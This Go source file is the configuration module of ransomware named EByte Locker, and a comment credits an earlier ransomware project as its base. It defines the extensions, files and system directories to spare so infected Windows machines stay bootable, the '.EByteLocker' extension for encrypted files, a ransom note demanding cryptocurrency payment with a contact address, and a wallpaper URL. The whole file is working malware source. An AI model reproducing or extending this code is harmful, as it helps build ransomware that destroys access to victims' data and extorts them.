package configuration
// again credits to prince rware check readme for more info. this was solid base :)
var ExcludedExtensions = []string{".sys", ".exe", ".dll", ".com", ".scr", ".bat", ".vbs", ".ps1", ".lnk", ".inf", ".reg", ".msi", ".ini", EncryptedExtension}
var ExcludedFiles = []string{"boot.ini", "bootmgr", "bcd", "desktop.ini", "config.sys", "autoexec.bat", "decryption instructions.txt"}
var ExcludedDirectories = []string{"windows", "system32", "programdata", "program files", "program files (x86)", "public", "system volume information", "\\system volume information", "efi", "boot", "public", "perflogs", "microsoft", "intel", "appdata", ".dotnet", ".gradle", ".nuget", ".vscode", "msys64"}
var EncryptedExtension string = ".EByteLocker"
var PublicKey string
var RansomNote string = "---------- EByte Locker  ----------\nYour files have been encrypted using EByte Ransomware!\nThey can only be decrypted by paying us a ransom in cryptocurrency.\n\nEncrypted files have the .EByteLocker extension.\nIMPORTANT: Do not modify or rename encrypted files, as they may become unrecoverable.\n\nContact us at the following email address to discuss payment.\nexample@airmail.cc\n---------- EByteLocker ----------"
var WallpaperURL = "https://i.imgur.com/zQ1ei8j.png"
